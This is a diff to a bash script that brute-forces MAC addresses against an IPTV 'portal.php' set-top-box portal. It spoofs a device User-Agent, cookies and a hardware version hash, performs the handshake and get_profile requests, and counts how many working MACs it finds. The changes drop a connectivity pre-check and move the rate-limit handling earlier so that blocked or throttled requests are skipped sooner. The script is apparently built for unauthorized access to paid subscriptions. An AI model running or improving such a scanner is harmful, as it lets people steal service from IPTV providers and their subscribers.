@@ -7,8 +7,8 @@ if [ -z "$URL" ]; then
     exit 1
 fi
 
-RED=$'\033[0;31m'
 GREEN=$'\033[0;32m'
+RED=$'\033[0;31m'
 YELLOW=$'\033[0;33m'
 LIGHT_BLUE=$'\033[0;94m'
 RESET=$'\033[0m'
@@ -25,18 +25,6 @@ UA="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) 
 # Very-low per-request timeout: blocked/ratelimited IPs hang ~12s before closing;
 # fail fast and ignore such responses instead of stalling workers.
 SCAN_TIMEOUT=2
-
-printf 'Checking portal connectivity... '
-http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 \
-  -H "User-Agent: $UA" \
-  -H "Cookie: mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/Amsterdam;" \
-  "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
-if [ "$http_code" = "000" ]; then
-    printf '%sFAILED%s\n' "$RED" "$RESET"
-    printf '%sError: Cannot reach %s (connection refused or timeout)%s\n' "$RED" "$URL" "$RESET"
-    exit 1
-fi
-printf '%sOK (HTTP %s)%s\n' "$GREEN" "$http_code" "$RESET"
 
 read -rp "${YELLOW}How many MACs do you want to find? ${RESET}" max_success_count
 read -rp "${YELLOW}Parallel workers? [10] ${RESET}" num_workers
@@ -69,6 +57,12 @@ scan_mac() {
       -H "User-Agent: $UA" \
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       "$URL/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml")
+    # 000 / non-200 handshake (blocked, ratelimited, ...): show, try next MAC
+    if ! echo "$response" | $GREP -q "200"; then
+      progress "scanning: $MAC [${RED}connection failed, ratelimited?${RESET}]"
+      continue
+    fi
+
     token=$(echo "$response" | $GREP -oP '(?<="token":")[^"]*')
 
     curl -s -o /dev/null --max-time $SCAN_TIMEOUT \
@@ -76,11 +70,6 @@ scan_mac() {
       -H "Cookie: mac=$MAC; stb_lang=en; timezone=Europe/Amsterdam;" \
       -H "Authorization: Bearer $token" \
       "$URL/portal.php?type=stb&action=get_profile&auth_second_step=1&hw_version_2=1635b1c3e68859923ab3bb72192e089f66e7dd9e&JsHttpRequest=1-xml"
-
-    # 000 / non-200 handshake (blocked, ratelimited, ...): ignore, try next MAC
-    if ! echo "$response" | $GREP -q "200"; then
-      continue
-    fi
 
     genres=$(curl -s --max-time $SCAN_TIMEOUT \
       -H "User-Agent: $UA" \
